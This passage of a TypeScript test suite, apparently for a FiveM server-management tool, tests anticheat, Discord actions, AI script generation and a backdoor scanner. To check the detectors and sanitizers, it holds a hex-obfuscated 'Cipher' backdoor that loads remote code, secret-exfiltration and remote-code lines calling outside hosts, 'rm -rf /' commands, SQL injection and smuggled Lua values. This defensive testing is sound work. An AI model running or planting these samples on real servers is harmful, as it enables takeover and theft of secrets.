});

test("anticheat: detections keep their position, refused connections are logged, bans follow banHours, strikes escalate", async () => {
  const t = ts();
  const settings = m.securityConfig.anticheatSchema.parse({ banHours: 48, strikes: { enabled: true, windowHours: 24, kickAt: 2, banAt: 3 } });
  await m.security.saveSecuritySettings(SEC2, { discordId: A }, "anticheat", settings);
  await agentCall(SEC2, {
    events: [{ type: "join", session: "z1", name: "Zap", identifiers: ["license:zap"], tokens: ["2:pc"], timestamp: t }],
    state: { hostname: "h", maxClients: 8, uptime: 1, players: [{ id: 4, name: "Zap", session: "z1", ping: 30 }], resources: [] }
  });
  // 1st detection: recorded with its position; 2nd: kick (strike 2); 3rd: ban for 48 h.
  const det = (n: number) => ({ type: "detection", session: "z1", name: "Zap", kind: "speedhack", action: "log", details: { n }, pos: [100.4, -200.6, 30], timestamp: t + n });
  await agentCall(SEC2, { events: [det(1)] });
  const [first] = await m.security.listDetections(SEC2);
  assert.deepEqual(first.details.pos, [100, -201, 30]);
  assert.equal((await m.live.recentDetectionsWithPosition(SEC2)).length, 1);

  const second = await agentCall(SEC2, { events: [det(2)] });
  assert.deepEqual(second.commands.map((c) => [c.kind, c.payload.target]), [["kick", 4]]);
  await agentCall(SEC2, { events: [det(3)] });
  const bans = await m.security.listBans(SEC2, { active: true });
  assert.equal(bans.length, 1);
  assert.ok(bans[0].reason.includes("3 détections"));
  const hours = (new Date(bans[0].expiresAt!).getTime() - (t + 3) * 1000) / 3600_000;
  assert.ok(Math.abs(hours - 48) < 0.1, `ban of ${hours} h`);
  await agentCall(SEC2, { events: [det(4)] });
  assert.equal((await m.security.listBans(SEC2, { active: true })).length, 1); // not banned twice

  await agentCall(SEC2, { events: [{ type: "refused", name: "Zap", reason: "banni", identifiers: ["license:zap", "ip:1.1.1.1"], timestamp: t + 10 }] });
  const refused = (await m.security.listDetections(SEC2, { kind: "connection_refused" }))[0];
  assert.deepEqual([refused.details.reason, refused.playerId !== null], ["banni", true]);
});

test("linked accounts: same hardware token or same Discord, banned ones first", async () => {
  const t = ts();
  await agentCall(SEC2, { events: [
    { type: "join", session: "alt1", name: "ZapAlt", identifiers: ["license:zapalt"], tokens: ["2:pc"], timestamp: t },
    { type: "join", session: "o1", name: "Other", identifiers: ["license:other", `discord:${B}`], tokens: ["9:x"], timestamp: t },
    { type: "join", session: "o2", name: "OtherBis", identifiers: ["license:otherbis", `discord:${B}`], timestamp: t }
  ] });
  const players = (await m.players.listPlayers(SEC2)).rows;
  const id = (name: string) => players.find((p) => p.name === name)!.id;
  const linked = await m.live.linkedAccounts(SEC2, id("ZapAlt"));
  assert.deepEqual(linked.map((l) => [l.name, l.shared, l.banned]), [["Zap", ["matériel"], true]]);
  assert.deepEqual((await m.live.linkedAccounts(SEC2, id("Other"))).map((l) => [l.name, l.shared]), [["OtherBis", ["discord"]]]);
});

test("live screen: frames are kept while watched, the agent is told to stop otherwise", async () => {
  const t0 = new Date();
  assert.equal(await m.live.storeFrame(SEC2, 4, "Zap", new Uint8Array([1]), "image/jpeg", t0), false); // nobody asked
  await m.live.watchScreen(SEC2, 4, "Zap", t0);
  assert.equal(await m.live.storeFrame(SEC2, 4, "Zap", new Uint8Array([7, 8]), "image/jpeg", new Date(t0.getTime() + 1000)), true);
  const frame = await m.live.readFrame(SEC2, 4, new Date(t0.getTime() + 10_000)); // refreshes the watch
  assert.deepEqual([...frame!.image], [7, 8]);
  assert.equal(await m.live.storeFrame(SEC2, 4, "Zap", new Uint8Array([9]), "image/jpeg", new Date(t0.getTime() + 20_000)), true);
  assert.equal(await m.live.storeFrame(SEC2, 4, "Zap", new Uint8Array([9]), "image/jpeg", new Date(t0.getTime() + 60_000)), false);
  assert.equal(await m.live.readFrame("other", 4), null);
});

test("bot actions: queued per guild, handed once, results stored, stale ones expire", async () => {
  const guild = "570000000000000001";
  const created = await m.servers.createServer({ name: "Bot Actions", guildId: guild, createdBy: A });
  assert.ok(created.ok);
  const id = created.server.id;
  const t0 = new Date();
  const lock = await m.live.enqueueBotAction(id, { discordId: A }, "lockdown", { minutes: 30, lockChannels: true }, t0);
  const handed = await m.live.exchangeBotActions([], t0);
  assert.deepEqual(handed.filter((a) => a.id === lock).map((a) => [a.guildId, a.kind, a.payload.minutes]), [[guild, "lockdown", 30]]);
  assert.equal((await m.live.exchangeBotActions([], t0)).some((a) => a.id === lock), false); // only once
  await m.live.exchangeBotActions([{ id: lock, ok: true, message: "Verrouillé" }], t0);
  const old = await m.live.enqueueBotAction(id, { discordId: A }, "unlock", {}, new Date(t0.getTime() - 10 * 60_000));
  await m.live.exchangeBotActions([], t0);
  const listed = await m.live.listBotActions(id);
  assert.deepEqual(listed.map((a) => [a.id, a.status]), [[old, "expired"], [lock, "done"]]);
  const logs = await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ?", [id]);
  assert.ok(logs.some((l) => l.action === "discord_lockdown"));
});

test("backups: stored per server, the 15 latest kept, read back for a restore", async () => {
  const data = { roles: [{ id: "1" }], channels: [{ id: "2" }, { id: "3" }], members: { "4": ["1"] } };
  let last = 0;
  for (let i = 0; i < 17; i++) last = await m.live.storeBackup(SEC2, i === 16 ? "manuelle" : "automatique", data, new Date(Date.now() + i * 1000));
  const list = await m.live.listBackups(SEC2);
  assert.equal(list.length, 15);
  assert.deepEqual([list[0].id, list[0].reason, list[0].roles, list[0].channels, list[0].members], [last, "manuelle", 1, 2, 1]);
  assert.deepEqual(await m.live.getBackupData(SEC2, last), data);
  assert.equal(await m.live.getBackupData("other", last), null);
  assert.ok(await m.live.lastBackupAt(SEC2));
});

// ---- Studio IA ----

test("zip: CRC-32 and a valid stored archive with UTF-8 names", () => {
  assert.equal(m.zip.crc32(new TextEncoder().encode("123456789")), 0xcbf43926);
  const out = m.zip.zip([{ path: "res/fxmanifest.lua", content: "fx_version 'cerulean'" }, { path: "res/html/é.html", content: "<html></html>" }]);
  const view = new DataView(out.buffer);
  assert.equal(view.getUint32(0, true), 0x04034b50);
  const end = out.length - 22;
  assert.equal(view.getUint32(end, true), 0x06054b50);
  assert.equal(view.getUint16(end + 10, true), 2);
  assert.equal(view.getUint32(view.getUint32(end + 16, true), true), 0x02014b50);
});

test("studio checks: Lua blocks counted outside strings and comments, missing files and risky calls flagged", () => {
  const ok = [
    "-- if this were code it would end",
    'local s = "function if do"',
    "--[[ do",
    "end end ]]",
    'local t = { ["end"] = 1 }',
    "for i = 1, 3 do",
    "  if i == 2 then print([[ function ]]) elseif i == 3 then print(t.end) end",
    "end",
    "local f = function() return 1 end"
  ].join("\n");
  assert.deepEqual(m.shared.luaBalance(ok), { opens: 3, ends: 3 });
  assert.deepEqual(m.shared.luaBalance("if a then\n  b()\n"), { opens: 1, ends: 0 });

  const checks = m.shared.checkFiles([
    { path: "fxmanifest.lua", content: "fx_version 'cerulean'\ngame 'gta5'\nclient_script 'client.lua'\nserver_script 'server.lua'\nshared_script '@ox_lib/init.lua'" },
    { path: "client.lua", content: "CreateThread(function()\n  Wait(0)\n" },
    { path: "server.lua", content: "RegisterNetEvent('x:pay', function(n)\n  local p = ESX.GetPlayerFromId(source)\n  p.addMoney(n)\nend)\nos.execute('rm -rf /')" }
  ]);
  assert.ok(checks.some((c) => c.file === "client.lua" && c.level === "error" && /end/.test(c.message)));
  assert.ok(checks.some((c) => c.file === "server.lua" && c.level === "error" && /système/.test(c.message)));
  assert.ok(checks.some((c) => c.file === "server.lua" && c.level === "warn" && /cheater/.test(c.message)));
  assert.ok(!checks.some((c) => /ox_lib/.test(c.message)), "@ dependencies are not local files");
  assert.ok(m.shared.checkFiles([{ path: "fxmanifest.lua", content: "fx_version 'cerulean'\nclient_script 'missing.lua'" }]).some((c) => /missing\.lua/.test(c.message)));
  assert.ok(m.shared.checkFiles([]).some((c) => /fxmanifest/.test(c.message)));
});

test("studio files: safe paths only, limits enforced, slugs, stable hash", () => {
  const cleaned = m.shared.cleanFiles([
    { path: "./client.lua", content: "a\r\nb" },
    { path: "../evil.lua", content: "x" },
    { path: "/etc/passwd.txt", content: "x" },
    { path: "html\\index.html", content: "<html></html>" },
    { path: "fxmanifest.lua", content: "fx" },
    { path: "run.exe", content: "x" }
  ]);
  assert.deepEqual(cleaned.map((f) => f.path), ["fxmanifest.lua", "client.lua", "html/index.html"]);
  assert.equal(cleaned[1].content, "a\nb");
  assert.throws(() => m.shared.cleanFiles([{ path: "big.lua", content: "x".repeat(m.shared.LIMITS.fileBytes + 1) }]), /file_too_large/);
  assert.equal(m.shared.resourceSlug("Menu Garage (été) !"), "fvx_menu_garage_ete");
  assert.equal(m.shared.resourceSlug("!!!"), "fvx_creation");
  assert.equal(m.shared.filesHash(cleaned), m.shared.filesHash([...cleaned]));
  assert.notEqual(m.shared.filesHash(cleaned), m.shared.filesHash([{ ...cleaned[0], content: "fy" }, ...cleaned.slice(1)]));
});

test("studio AI reply: JSON in fences, files as object or list, null deletes, tests and objects kept", () => {
  const reply = m.studio.parseAIReply('Voici :\n```json\n{"summary":"HUD ajouté","files":{"client.lua":"print(1)","old.lua":null},"tests":[{"label":"Ouvrir","data":{"action":"open"}}]}\n```');
  assert.equal(reply!.summary, "HUD ajouté");
  assert.deepEqual(reply!.tests, [{ label: "Ouvrir", data: { action: "open" } }]);
  const next = m.studio.applyFiles([{ path: "old.lua", content: "x" }, { path: "client.lua", content: "y" }, { path: "keep.lua", content: "k" }], reply!.files!);
  assert.deepEqual(next.map((f) => [f.path, f.content]), [["client.lua", "print(1)"], ["keep.lua", "k"]]);
  assert.equal(m.studio.parseAIReply('{"files":[{"path":"a.lua","content":"1"}]}')!.files!.get("a.lua"), "1");
  assert.equal(m.studio.parseAIReply('{"summary":"rien"}'), null);
  assert.equal(m.studio.parseAIReply("pas de json"), null);
  assert.equal(m.studio.parseAIReply('{"objects":[{"model":"prop_bin_01a"}]}')!.objects!.length, 1);
});

test("mapping: invalid objects dropped, offsets become game coordinates in valid Lua", () => {
  const map = m.shared.cleanMap({
    center: [100, -200, 30],
    distance: 5,
    objects: [
      { id: "a", model: "prop_roadcone02a", x: 2, y: -3, z: 0.5, heading: 450 },
      { model: "bad model'); os.execute('x", x: 0, y: 0 },
      { model: "prop_bin_01a", x: 9999, y: 1, ground: false }
    ]
  });
  assert.equal(map.distance, 20);
  assert.equal(map.objects.length, 2);
  assert.equal(map.objects[0].heading, 90);
  assert.equal(map.objects[1].x, 500);
  const files = m.shared.mapFiles("Barrage", map);
  const client = files.find((f) => f.path === "client.lua")!.content;
  assert.match(client, /model = 'prop_roadcone02a', pos = vector3\(102\.000, -203\.000, 30\.500\), heading = 90\.00, ground = true/);
  assert.match(client, /ground = false/);
  const balance = m.shared.luaBalance(client);
  assert.equal(balance.opens, balance.ends);
  assert.deepEqual(m.shared.checkFiles(files).filter((c) => c.level === "error"), []);
});

test("studio creations: versions, restore, unique resource, deploy queued for the agent without files in the logs", async () => {
  const SV = "studio-srv";
  const actor = { discordId: A, username: "a" };
  const id = await m.studio.createCreation(SV, actor, { kind: "script", name: "Réparation", framework: "esx" });
  await assert.rejects(m.studio.createCreation(SV, actor, { kind: "ui", name: "Réparation", framework: "standalone" }), /resource_taken/);
  await assert.rejects(m.studio.createCreation(SV, actor, { kind: "ui", name: "x", resource: "Bad Name", framework: "standalone" }), /invalid_resource/);

  const manifest = { path: "fxmanifest.lua", content: "fx_version 'cerulean'\ngame 'gta5'\nclient_script 'client.lua'" };
  await m.studio.saveCreation(SV, actor, id, { files: [manifest, { path: "client.lua", content: "print('v1')" }] }, { source: "manual", summary: "v1" });
  const saved = await m.studio.saveCreation(SV, actor, id, { files: [manifest, { path: "client.lua", content: "print('v2')" }] }, { source: "ai", prompt: "change", summary: "v2" });
  assert.equal(saved.files[1].content, "print('v2')");
  assert.deepEqual(saved.versions.map((v) => v.source), ["ai", "manual", "create"]);
  assert.equal(saved.versions[0].prompt, "change");

  const restored = await m.studio.restoreVersion(SV, actor, id, saved.versions[1].id);
  assert.equal(restored.files[1].content, "print('v1')");
  assert.equal(restored.versions.length, 4);
  assert.equal((await m.studio.listCreations(SV, "script"))[0].fileCount, 2);
  assert.deepEqual(await m.studio.listCreations(SV, "ui"), []);

  delete process.env.AI_API_KEY;
  await assert.rejects(m.studio.generateCreation(SV, actor, id, "ajoute une commande"), /ai_not_configured/);

  // Deploy: the agent receives the files; the log only says how many.
  const cmd = await m.agent.enqueueCommand(SV, actor, "deploy", { resource: restored.resource, files: restored.files });
  await m.studio.markDeploy(SV, id, cmd, restored.files);
  const call = await agentCall(SV, { version: "3.2.0" });
  const sent = call.commands.find((c) => c.id === cmd)!;
  assert.equal(sent.kind, "deploy");
  assert.deepEqual((sent.payload.files as { path: string }[]).map((f) => f.path), ["fxmanifest.lua", "client.lua"]);
  const log = await db.get<{ details: string }>("SELECT details FROM audit_log WHERE server_id = ? AND action = 'studio_deploy'", [SV]);
  assert.deepEqual(JSON.parse(log!.details), { resource: "fvx_reparation", files: 2 });
  await agentCall(SV, { version: "3.2.0", results: [{ id: cmd, ok: true, message: "fvx_reparation déployée" }] });
  let current = (await m.studio.getCreation(SV, id))!;
  assert.deepEqual([current.deploy.status, current.deploy.current], ["done", true]);
  current = await m.studio.saveCreation(SV, actor, id, { files: [manifest, { path: "client.lua", content: "print('v3')" }] }, { source: "manual" });
  assert.deepEqual([current.deploy.status, current.deploy.current], ["done", false]);

  // The agent's schema refuses paths that leave the resource.
  assert.equal(m.agent.COMMANDS.deploy.schema.safeParse({ resource: "fvx_x", files: [{ path: "../server.cfg", content: "" }] }).success, false);

  assert.equal(await m.studio.deleteCreation(SV, actor, id), true);
  assert.equal(await m.studio.getCreation(SV, id), null);
  assert.equal((await db.get<{ n: number }>("SELECT COUNT(*) AS n FROM studio_versions WHERE creation_id = ?", [id]))!.n, 0);
});

/** A Blockly workspace with these top blocks. */
const ws = (...blocks: unknown[]) => ({ blocks: { languageVersion: 0, blocks } });
const chain = (...list: Record<string, unknown>[]): Record<string, unknown> | undefined =>
  list.length ? { ...list[0], ...(list.length > 1 ? { next: { block: chain(...list.slice(1)) } } : {}) } : undefined;
const balanced = (files: { path: string; content: string }[]) =>
  files.filter((f) => f.path.endsWith(".lua")).every((f) => { const b = m.shared.luaBalance(f.content); return b.opens === b.ends; });

test("studio blocks: events run on the right side, server actions reach the player, misplaced blocks warned", () => {
  const starter = m.blocks.blocksFiles("Soin", "standalone", m.blocks.STARTER_BLOCKS);
  assert.deepEqual(starter.files.map((f) => f.path), ["fxmanifest.lua", "client.lua", "server.lua"]);
  assert.deepEqual(starter.warnings, []);
  const server = starter.files[2].content;
  assert.match(server, /RegisterCommand\("soin", function\(src, args\)/);
  assert.match(server, /TriggerClientEvent\(EVENT, src, "heal"\)/);
  assert.match(server, /TriggerClientEvent\(EVENT, src, "notify", "Tu es soigné !"\)/);
  assert.match(starter.files[1].content, /function A\.heal\(\)[\s\S]*RegisterNetEvent\(EVENT/);
  assert.ok(balanced(starter.files));
  assert.equal(m.shared.checkFiles(starter.files).filter((c) => c.level === "error").length, 0);

  // Key + zone on the client; money and admin check misplaced there; an orphan block.
  const text = (t: string) => ({ shadow: { type: "text", fields: { TEXT: t } } });
  const client = m.blocks.blocksFiles("Test", "esx", ws(
    { type: "fvx_on_key", fields: { KEY: "F6" }, inputs: { DO: { block: chain({ type: "fvx_repair" }, { type: "fvx_money", fields: { MODE: "ADD", ACCOUNT: "cash" } }) } } },
    { type: "fvx_on_zone", fields: { X: 1, Y: 2, Z: 3, R: 4, PRESS: true, MARKER: false }, inputs: { DO: { block: { type: "controls_if", inputs: { IF0: { block: { type: "fvx_is_admin" } }, DO0: { block: { type: "fvx_notify", inputs: { TEXT: text("ok") } } } } } } } },
    { type: "fvx_heal" }
  ));
  assert.deepEqual(client.files.map((f) => f.path), ["fxmanifest.lua", "client.lua"]);
  const c = client.files[1].content;
  assert.match(c, /RegisterKeyMapping\(KEY_1, .*"keyboard", "F6"\)/);
  assert.match(c, /A\.repair\(\)/);
  assert.match(c, /vector3\(1, 2, 3\), 4/);
  assert.match(c, /if false then/);
  assert.doesNotMatch(c, /RegisterNetEvent|money\(|DrawMarker/);
  assert.equal(client.warnings.length, 3, client.warnings.join(" | "));
  assert.ok(client.warnings.some((w) => /argent/.test(w)) && client.warnings.some((w) => /admin/.test(w)) && client.warnings.some((w) => /hors d'un événement/.test(w)));
  assert.ok(balanced(client.files));

  // Money: framework helper and dependency; standalone refuses; admin command restricted.
  const money = (fw: "esx" | "qbcore" | "standalone") => m.blocks.blocksFiles("Paie", fw, ws({
    type: "fvx_on_command", fields: { NAME: "/Paie", ADMIN: true },
    inputs: { DO: { block: { type: "fvx_money", fields: { MODE: "REMOVE", ACCOUNT: "bank" }, inputs: { AMOUNT: { block: { type: "fvx_cmd_arg", fields: { N: 1 } } } } } } }
  }));
  const esx = money("esx");
  assert.match(esx.files[0].content, /dependencies \{ 'es_extended' \}/);
  assert.match(esx.files[1].content, /getSharedObject[\s\S]*RegisterCommand\("paie"[\s\S]*money\(src, -\(tonumber\(\(args\[1\] or ""\)\) or 0\), "bank"\)[\s\S]*end, true\)/);
  assert.deepEqual(esx.files.map((f) => f.path), ["fxmanifest.lua", "server.lua"]);
  assert.match(money("qbcore").files[1].content, /QBCore\.Functions\.GetPlayer\(src\)/);
  assert.ok(money("standalone").warnings.some((w) => /framework/.test(w)));
  assert.ok(balanced(esx.files));

  // Field values never break out of the Lua: names are checked, texts escaped.
  const bad = m.blocks.blocksFiles("X", "standalone", ws(
    { type: "fvx_on_command", fields: { NAME: 'a") os.execute("rm' }, inputs: { DO: { block: { type: "fvx_heal" } } } },
    { type: "fvx_on_start", inputs: { DO: { block: chain(
      { type: "fvx_notify", inputs: { TEXT: text('"]] os.execute("x") --\n') } },
      { type: "fvx_vehicle", fields: { MODEL: "adder'); os.exit(" } }
    ) } } }
  ));
  const all = bad.files.map((f) => f.content).join("\n");
  assert.doesNotMatch(all, /RegisterCommand\("a/);
  assert.match(all, /A\.notify\("\\"\]\] os\.execute\(\\"x\\"\) --\\n"\)/);
  assert.doesNotMatch(all, /A\.vehicle/);
  assert.ok(bad.warnings.some((w) => /commande invalide/.test(w)) && bad.warnings.some((w) => /véhicule invalide/.test(w)));

  // A crafted, very deep workspace does not overflow; an oversized one is refused.
  let deep: Record<string, unknown> = { type: "math_number", fields: { NUM: 1 } };
  for (let i = 0; i < 5000; i++) deep = { type: "logic_negate", inputs: { BOOL: { block: deep } } };
  const deepWs = ws({ type: "fvx_on_start", inputs: { DO: { block: { type: "controls_if", inputs: { IF0: { block: deep } } } } } });
  assert.doesNotThrow(() => m.blocks.blocksFiles("D", "standalone", deepWs));
  assert.throws(() => m.blocks.cleanBlocks({ blocks: { blocks: [{ type: "x".repeat(400_000) }] } }), /blocks_too_large/);

  // Every block of the toolbox is understood by the generator.
  for (const def of m.blocks.BLOCK_DEFS) {
    const type = String(def.type);
    const res = m.blocks.blocksFiles("T", "esx", ws({ type: "fvx_on_command", fields: { NAME: "t" }, inputs: { DO: { block: def.output !== undefined ? { type: "fvx_print", inputs: { TEXT: { block: { type } } } } : { type } } } }));
    assert.ok(!res.warnings.some((w) => /inconnu/.test(w)), `${type}: ${res.warnings.join()}`);
  }
});

test("studio simple UI: escaped page, opening by command or key, HUD without focus, invalid values dropped", () => {
  const design = m.ui.cleanUIDesign({
    open: "key", command: "/Mon Menu!", key: "F7", position: "tr", width: 5000, accent: "red", theme: "glass",
    elements: [
      { type: "title", text: "<script>alert(1)</script>" },
      { type: "button", text: "Don", action: "command", command: "don;quit" },
      { type: "image", url: "javascript:alert(1)" },
      { type: "gauge", label: "Vie", stat: "nope", color: "#123456" },
      { type: "evil" }
    ]
  });
  assert.equal(design.command, "monmenu");
  assert.equal(design.width, 900);
  assert.equal(design.accent, "#8b5cf6");
  assert.deepEqual(design.elements.map((e) => e.type), ["title", "button", "image", "gauge"]);
  assert.equal((design.elements[1] as { command: string }).command, "donquit");
  assert.equal((design.elements[2] as { url: string }).url, "");
  assert.equal((design.elements[3] as { stat: string }).stat, "health");

  const files = m.ui.uiFiles("Mon menu", design);
  assert.deepEqual(files.map((f) => f.path), ["fxmanifest.lua", "client.lua", "html/index.html"]);
  const html = files[2].content;
  assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
  assert.match(html, /top: 4vh; right: 3vw;/);
  assert.match(html, /id="app" class="hidden"/);
  assert.match(files[1].content, /RegisterCommand\("monmenu"[\s\S]*RegisterKeyMapping\("monmenu", .*"F7"\)[\s\S]*RegisterNUICallback\("command"[\s\S]*GetPedArmour/);
  assert.ok(balanced(files));
  assert.equal(m.shared.checkFiles(files).filter((c) => c.level === "error").length, 0);
  assert.deepEqual(m.ui.uiTests(design).map((t) => t.label), ["Ouvrir", "Fermer", "Stats pleines", "Stats basses"]);

  const hud = m.ui.UI_TEMPLATES.find((t) => t.key === "hud")!.make();
  const hudFiles = m.ui.uiFiles("HUD", hud);
  assert.doesNotMatch(hudFiles[1].content, /SetNuiFocus|RegisterCommand/);
  assert.doesNotMatch(hudFiles[2].content, /class="hidden"/);
  for (const t of m.ui.UI_TEMPLATES) assert.ok(balanced(m.ui.uiFiles(t.label, t.make())), t.key);
});

test("studio visual creations: files generated from blocks / builder on every save, code mode keeps the code", async () => {
  const SV = "studio-visual";
  const actor = { discordId: A, username: "a" };
  const sid = await m.studio.createCreation(SV, actor, { kind: "script", name: "Blocs", framework: "standalone", visual: true });
  let script = (await m.studio.getCreation(SV, sid))!;
  assert.equal(script.data.mode, "visual");
  assert.match(script.files.find((f) => f.path === "server.lua")!.content, /RegisterCommand\("soin"/);

  // Files sent with a visual save are ignored: they come from the blocks.
  const pay = ws({ type: "fvx_on_command", fields: { NAME: "paie" }, inputs: { DO: { block: { type: "fvx_money", fields: { MODE: "ADD", ACCOUNT: "cash" }, inputs: { AMOUNT: { shadow: { type: "math_number", fields: { NUM: 100 } } } } } } } });
  script = await m.studio.saveCreation(SV, actor, sid, { files: [{ path: "server.lua", content: "os.execute('x')" }], data: { mode: "visual", blocks: pay } }, { source: "manual" });
  assert.doesNotMatch(script.files.map((f) => f.content).join(), /os\.execute|money\(src/);
  script = await m.studio.saveCreation(SV, actor, sid, { framework: "qbcore" }, { source: "manual" });
  assert.match(script.files.find((f) => f.path === "server.lua")!.content, /money\(src, \(tonumber\(100\) or 0\), "cash"\)/);

  // Code mode: the files are what is written.
  const code = [{ path: "fxmanifest.lua", content: "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'" }, { path: "server.lua", content: "print('main')" }];
  script = await m.studio.saveCreation(SV, actor, sid, { files: code, data: { mode: "code" } }, { source: "manual" });
  assert.equal(script.data.mode, undefined);
  assert.equal(script.files[1].content, "print('main')");
  await assert.rejects(m.studio.saveCreation(SV, actor, sid, { data: { mode: "visual", blocks: { blocks: { blocks: [{ type: "x".repeat(400_000) }] } } } }, { source: "manual" }), /blocks_too_large/);

  const uid = await m.studio.createCreation(SV, actor, { kind: "ui", name: "Mon HUD", framework: "standalone", visual: true, template: "hud" });
  const ui = (await m.studio.getCreation(SV, uid))!;
  assert.equal(ui.data.ui?.open, "always");
  assert.deepEqual(ui.files.map((f) => f.path), ["fxmanifest.lua", "client.lua", "html/index.html"]);
  assert.deepEqual(ui.data.tests?.map((t) => t.label), ["Stats pleines", "Stats basses"]);
});

// ---- Server audit ----

/** Real-world shape of the "Cipher" backdoor: function names hidden as \x escapes, looked up in _G, payload loaded. */
const CIPHER = String.raw`local _ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74", "\x61\x73\x73\x65\x72\x74", "\x6c\x6f\x61\x64", _G, "", nil} _[4][_[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (e, d) local s = _[4][_[2]](_[4][_[3]](d)) if (d == nil) then return end s() end)`;
const rulesOf = (path: string, code: string, role: "client" | "server" | "shared" | "ui" | "other") =>
  m.auditRules.analyzeFile(path, code, role).findings.map((f) => `${f.severity}:${f.rule}`);

test("audit rules: known backdoors are critical (hidden escapes, remote code, admin grant, system commands, secret theft)", () => {
  const cipher = rulesOf("server.lua", CIPHER, "server");
  assert.ok(cipher.includes("critical:hidden_code") && cipher.includes("critical:known_backdoor"), cipher.join());
  assert.deepEqual(rulesOf("s.lua", "PerformHttpRequest('https://x.example/p', function(c, body)\n  load(body)()\nend)", "server"), ["critical:remote_code"]);
  assert.deepEqual(rulesOf("s.lua", "RegisterCommand('x', function(src)\n  ExecuteCommand('add_principal identifier.' .. id .. ' group.admin')\nend)", "server"), ["critical:grant_admin"]);
  assert.deepEqual(rulesOf("s.lua", "local f = io.popen('whoami')", "server"), ["critical:system_command"]);
  assert.ok(rulesOf("s.lua", "local k = GetConvar('sv_licenseKey', '')\nPerformHttpRequest('https://x.example', function() end, 'POST', k)", "server").includes("critical:secret_exfiltration"));
  assert.ok(rulesOf("s.lua", "local _G = _G\n_G['Perform' .. 'HttpRequest']('https://x', function() end)", "server").includes("critical:hidden_code"));
  assert.deepEqual(rulesOf("s.js", "const https = require('https');\nhttps.get(u, r => { let d = ''; r.on('end', () => eval(d)) })", "server"), ["critical:remote_code"]);
  assert.deepEqual(rulesOf("s.js", "require('child_process').exec('rm -rf /')", "server"), ["critical:system_command"]);
  // Not backdoors: loading a file of the resource, the same words in comments and strings, eval in a NUI page.
  assert.deepEqual(rulesOf("s.lua", "-- PerformHttpRequest then load(body)\nlocal msg = 'os.execute is bad'\nlocal cfg = load(LoadResourceFile(GetCurrentResourceName(), 'config.lua'))()", "server"), []);
  assert.deepEqual(rulesOf("html/app.js", "fetch('https://cdn.example/x').then(() => eval('1+1'))", "ui"), []);
});

test("audit rules: exploitable events, SQL injections, secrets, client-side trust, performance, old libraries", () => {
  const events = m.auditRules.analyzeFile("server.lua", [
    "RegisterNetEvent('shop:buy', function(item, amount)",
    "  local xPlayer = ESX.GetPlayerFromId(source)",
    "  xPlayer.addInventoryItem(item, amount)",
    "end)",
    "RegisterNetEvent('job:pay', function()",
    "  ESX.GetPlayerFromId(source).addMoney(500)",
    "end)",
    "RegisterNetEvent('job:safe', function()",
    "  if #(GetEntityCoords(GetPlayerPed(source)) - Config.Point) > 5.0 then return end",
    "  ESX.GetPlayerFromId(source).addMoney(Config.Pay)",
    "end)"
  ].join("\n"), "server");
  assert.deepEqual(events.findings.map((f) => [f.rule, f.line]), [["trusted_event", 3], ["unchecked_reward", 5]]);
  assert.deepEqual(events.events, ["shop:buy", "job:pay", "job:safe"]);
  assert.match(events.findings[0].snippet!, /addInventoryItem\(item, amount\)/);

  assert.ok(rulesOf("s.lua", `MySQL.Async.fetchAll("SELECT * FROM users WHERE identifier = '" .. id .. "'", {})`, "server").includes("high:sql_injection"));
  assert.ok(!rulesOf("s.lua", "MySQL.query('SELECT * FROM users WHERE identifier = ?', { id })", "server").includes("high:sql_injection"));
  assert.ok(rulesOf("s.js", "exports.oxmysql.query(`SELECT * FROM users WHERE id = ${id}`)", "server").includes("high:sql_injection"));
  assert.ok(rulesOf("s.lua", "for _, p in ipairs(players) do\n  MySQL.update('UPDATE users SET x = 1 WHERE id = ?', { p })\nend", "server").includes("medium:sql_in_loop"));

  const hook = 'local URL = "https://discord.com/api/webhooks/123456789/abc-DEF_ghi"';
  assert.deepEqual(rulesOf("client.lua", hook, "client"), ["high:exposed_webhook"]);
  assert.deepEqual(rulesOf("server.lua", hook, "server"), ["info:server_webhook"]);
  assert.deepEqual(rulesOf("html/app.js", "const key = 'gsk_" + "a".repeat(48) + "'", "ui"), ["high:exposed_secret"]);

  assert.ok(rulesOf("c.lua", "TriggerServerEvent('shop:buyItem', 'bread', 50)", "client").includes("medium:client_trust"));
  const loop = (body: string) => `CreateThread(function()\n  while true do\n    Wait(0)\n    ${body}\n  end\nend)`;
  assert.deepEqual(rulesOf("c.lua", loop("local ped = PlayerPedId()"), "client"), ["medium:busy_loop"]);
  assert.deepEqual(rulesOf("c.lua", loop("DrawMarker(1, 0, 0, 0)"), "client"), []);
  assert.deepEqual(rulesOf("c.lua", "local ped = GetPlayerPed(-1)", "client"), ["info:deprecated_native"]);
  assert.ok(rulesOf("s.lua", "MySQL.Async.execute('UPDATE x SET y = 1', {})", "server").includes("medium:old_mysql"));
});

test("audit report: manifests, dependencies, assets, server.cfg, artifacts and a score capped by critical problems", () => {
  const file = (p: string, role: "client" | "server" | "shared" | "ui" | "other", hash: string, kind: "code" | "stream" = "code", size = 100) => ({ p, size, hash: kind === "code" ? hash : undefined, role, kind });
  const h = (c: string) => c.repeat(64);
  const inv = {
    convars: { sv_scriptHookAllowed: "1", version: "FXServer-master SERVER v1.0.0.7290 win32" },
    rcon: true,
    cfg: [{ path: "server.cfg", content: "ensure shop\nensure es_extended\nadd_ace builtin.everyone command allow\nadd_ace resource.shop command allow\nadd_ace resource.fiverax_agent command allow" }],
    resources: [
      { name: "es_extended", state: "started", meta: { fx_version: "cerulean", lua54: "yes" }, files: [file("server.lua", "server", h("a"))] },
      { name: "shop", state: "started", meta: { fx_version: "adamant", dependencies: ["es_extended", "ox_lib", "/onesync"] }, files: [file("server.lua", "server", h("b")), file("stream/car.ytd", "other", "", "stream", 20 * 1048576)] },
      { name: "cars", state: "started", meta: { fx_version: "cerulean", lua54: "yes" }, files: [file("stream/car.ytd", "other", "", "stream")] },
      { name: "old", state: "stopped", meta: { legacy: true }, files: [] },
